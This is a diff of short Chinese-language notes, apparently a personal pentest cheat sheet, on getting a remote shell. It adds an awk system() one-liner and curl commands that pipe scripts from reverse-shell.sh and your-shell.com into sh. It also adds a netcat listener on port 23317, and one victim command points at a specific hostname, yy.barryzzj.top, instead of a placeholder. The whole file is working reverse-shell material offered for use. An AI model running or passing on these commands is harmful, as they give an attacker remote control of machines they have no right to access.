@@ -15,8 +15,12 @@ cat file1 [... filen]
 awk 执行任意指令 （一定需要三个参数，system里也能写点别的，但是会弹出好多行，还没太懂）
 awk '{system("curl https://your-shell.com/<ip>:<port>|sh")}' file
 
-远程执行shell: Reverse Shell as a Service https://your-shell.com
+远程执行shell: Reverse Shell as a Service
+https://reverse-shell.sh/
+https://your-shell.com
+https://github.com/lukechilds/reverse-shell
 主机：
-nc -l <port>
+nc -l 23317
 被控机：
-curl https://your-shell.com/host:port|sh
+curl https://reverse-shell.sh/yy.barryzzj.top:23317|sh
+curl https://your-shell.com/yy.barryzzj.top:23317|sh
